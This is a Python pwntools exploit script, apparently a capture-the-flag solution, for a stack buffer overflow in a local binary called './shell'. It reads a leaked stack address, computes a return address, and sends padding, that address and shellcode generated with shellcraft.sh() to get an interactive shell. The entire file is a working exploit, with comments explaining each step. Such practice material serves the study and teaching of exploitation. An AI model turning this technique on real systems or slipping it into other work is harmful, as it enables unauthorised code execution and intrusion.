#!/usr/bin/env python3

from pwn import *

#setting the context will allow us to create a shell that will work based on the binaries architecture.
context.binary = ('./shell')

p = process('./shell')

buffer = 0x38 * b'A'
shell = asm(shellcraft.sh()) #creating the payload using the assembler function

p.recvuntil(b'= ') #recieve up until the leaked address

leakedAddress = (p.recvline().strip()) #strips the address of whitespace

log.info(f'Leaked Address => {leakedAddress}')

strAddr = leakedAddress.decode('utf-8') #converts raw bytes to string


intAddr = int(strAddr, 16) #converts string to hex

log.info(f'Integer Address => {hex(intAddr)}')


returnAddr = intAddr + 0x3c #found the offset to the previous frames stack pointer to return to

log.info(f'Return Address => {hex(returnAddr)}')

payload = buffer + p32(returnAddr) + shell

log.info(f'Payload => {payload}')


p.sendline(payload)

p.interactive()


